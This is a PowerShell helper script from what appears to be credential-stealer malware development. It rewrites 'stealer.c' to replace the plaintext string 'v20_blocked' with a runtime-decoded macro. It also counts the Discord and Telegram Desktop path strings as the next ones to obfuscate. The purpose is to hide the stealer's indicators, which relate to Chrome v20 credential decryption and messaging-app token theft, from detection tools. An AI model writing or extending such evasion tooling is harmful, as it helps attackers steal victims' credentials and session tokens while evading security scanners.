$files = @{
    'agent\native\stealer.c' = @{
        '"v20_blocked"' = '({ char _s[16]; DEC_STATUS_V20_BLOCKED(_s); _s; })'
    }
    'agent\native\chrome_v20.c' = @{}
}

# For stealer.c - the v20_blocked is inside strncpy, need different approach
# Let's just do targeted replacements per file

# --- stealer.c ---
$f = 'agent\native\stealer.c'
$c = Get-Content $f -Raw

# Replace: strncpy(cred->decrypt_status, "v20_blocked", 15);
# With: { char _vb[16]; DEC_STATUS_V20_BLOCKED(_vb); strncpy(cred->decrypt_status, _vb, 15); }
$c = $c -replace 'strncpy\(cred->decrypt_status, "v20_blocked", 15\);', '{ char _vb[16]; DEC_STATUS_V20_BLOCKED(_vb); strncpy(cred->decrypt_status, _vb, 15); }'

# Discord paths - these are in struct initializer, harder to replace with macros
# We'll use a different approach - decrypt at function start
# For now count what needs changing
$matches = [regex]::Matches($c, '"Discord')
Write-Host "stealer.c: Discord matches: $($matches.Count)"

$matches = [regex]::Matches($c, 'Telegram Desktop')
Write-Host "stealer.c: Telegram matches: $($matches.Count)"

Set-Content $f $c -NoNewline
Write-Host "stealer.c: v20_blocked replaced"

Write-Host "Done"
